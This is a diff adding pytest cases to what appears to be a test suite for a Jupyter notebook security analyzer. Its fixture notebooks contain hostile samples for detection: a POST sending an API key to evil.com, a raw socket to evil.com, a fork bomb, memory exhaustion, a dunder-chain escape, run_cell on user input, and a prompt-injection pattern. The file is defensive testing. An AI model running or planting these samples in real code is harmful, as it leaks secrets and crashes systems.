@@ -1546,3 +1546,327 @@ class TestAdvancedXSS:
 
         temp_notebook.unlink()
 
+
+
+class TestNetworkExfiltration:
+    """Tests for network and data exfiltration detection."""
+
+    def test_http_post_detection(self, temp_notebook):
+        """Test detection of HTTP POST requests."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import requests\n",
+                        "data = {'secret': api_key}\n",
+                        "requests.post('https://evil.com/collect', json=data)\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        network_issues = [i for i in issues if "Network" in i.category or "Exfiltration" in i.category]
+        assert len(network_issues) >= 1
+        assert any("POST" in i.message or "post" in i.code_snippet for i in network_issues)
+
+        temp_notebook.unlink()
+
+    def test_database_connection_detection(self, temp_notebook):
+        """Test detection of database connections."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import psycopg2\n",
+                        "conn = psycopg2.connect('postgresql://user:pass@host/db')\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        network_issues = [i for i in issues if "Network" in i.category or "database" in i.message.lower()]
+        assert len(network_issues) >= 1
+
+        temp_notebook.unlink()
+
+    def test_raw_socket_detection(self, temp_notebook):
+        """Test detection of raw socket access."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import socket\n",
+                        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
+                        "s.connect(('evil.com', 80))\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        network_issues = [i for i in issues if "Network" in i.category or "socket" in i.message.lower()]
+        assert len(network_issues) >= 1
+        assert any(i.severity == "CRITICAL" for i in network_issues)
+
+        temp_notebook.unlink()
+
+
+class TestResourceExhaustion:
+    """Tests for resource exhaustion detection."""
+
+    def test_infinite_loop_detection(self, temp_notebook):
+        """Test detection of infinite loops."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "while True:\n",
+                        "    print('forever')\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        resource_issues = [i for i in issues if "Resource Exhaustion" in i.category or "Infinite loop" in i.message]
+        assert len(resource_issues) >= 1
+        assert any(i.severity == "CRITICAL" for i in resource_issues)
+
+        temp_notebook.unlink()
+
+    def test_large_memory_allocation(self, temp_notebook):
+        """Test detection of large memory allocations."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "huge_list = [0] * 10**10  # 10 billion elements\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        resource_issues = [i for i in issues if "Resource Exhaustion" in i.category or "memory" in i.message.lower()]
+        assert len(resource_issues) >= 1
+
+        temp_notebook.unlink()
+
+    def test_fork_bomb_detection(self, temp_notebook):
+        """Test detection of fork bomb patterns."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import os\n",
+                        "while True:\n",
+                        "    os.fork()\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        resource_issues = [i for i in issues if "Resource Exhaustion" in i.category or "fork" in i.message.lower()]
+        assert len(resource_issues) >= 1
+        assert any(i.severity == "CRITICAL" for i in resource_issues)
+
+        temp_notebook.unlink()
+
+
+class TestAdvancedCodeInjection:
+    """Tests for advanced code injection detection."""
+
+    def test_dunder_method_access(self, temp_notebook):
+        """Test detection of dunder method access."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "obj = 'test'\n",
+                        "result = getattr(obj, '__class__').__bases__[0]\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        injection_issues = [i for i in issues if "Code Injection" in i.category and "dunder" in i.message.lower()]
+        assert len(injection_issues) >= 1
+        assert any(i.severity == "CRITICAL" for i in injection_issues)
+
+        temp_notebook.unlink()
+
+    def test_ipython_run_cell_injection(self, temp_notebook):
+        """Test detection of IPython run_cell injection."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "from IPython import get_ipython\n",
+                        "user_code = input('Enter code: ')\n",
+                        "get_ipython().run_cell(user_code)\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        injection_issues = [i for i in issues if "Code Injection" in i.category and "run_cell" in i.message.lower()]
+        assert len(injection_issues) >= 1
+
+        temp_notebook.unlink()
+
+
+class TestAdvancedMLSecurity:
+    """Tests for advanced ML/AI security detection."""
+
+    def test_prompt_injection_detection(self, temp_notebook):
+        """Test detection of prompt injection vulnerabilities."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import openai\n",
+                        "user_input = input('Query: ')\n",
+                        "response = openai.ChatCompletion.create(\n",
+                        "    model='gpt-4',\n",
+                        "    messages=[{'role': 'user', 'content': 'System: ' + user_input}]\n",
+                        ")\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        ml_issues = [i for i in issues if "ML" in i.category and "prompt" in i.message.lower()]
+        assert len(ml_issues) >= 1
+        assert any(i.severity == "CRITICAL" for i in ml_issues)
+
+        temp_notebook.unlink()
+
+    def test_adversarial_input_detection(self, temp_notebook):
+        """Test detection of adversarial input risks."""
+        notebook = {
+            "cells": [
+                {
+                    "cell_type": "code",
+                    "execution_count": 1,
+                    "source": [
+                        "import torch\n",
+                        "# Accept user input and use in model prediction\n",
+                        "user_image = input('Upload image path: ')\n",
+                        "prediction = model.predict(user_image)\n",
+                    ],
+                    "outputs": [],
+                    "metadata": {},
+                }
+            ],
+            "metadata": {},
+            "nbformat": 4,
+            "nbformat_minor": 5,
+        }
+        temp_notebook.write_text(json.dumps(notebook))
+
+        analyzer = NotebookSecurityAnalyzer()
+        issues = analyzer.analyze_notebook(temp_notebook)
+
+        # Should detect input() and/or .predict() in ML context
+        ml_issues = [i for i in issues if "ML" in i.category or ("input" in i.message.lower() and "predict" in ' '.join([iss.code_snippet for iss in issues]).lower())]
+        # At minimum should detect input() usage
+        input_issues = [i for i in issues if "input(" in i.code_snippet]
+        assert len(ml_issues) >= 1 or len(input_issues) >= 1
+
+        temp_notebook.unlink()
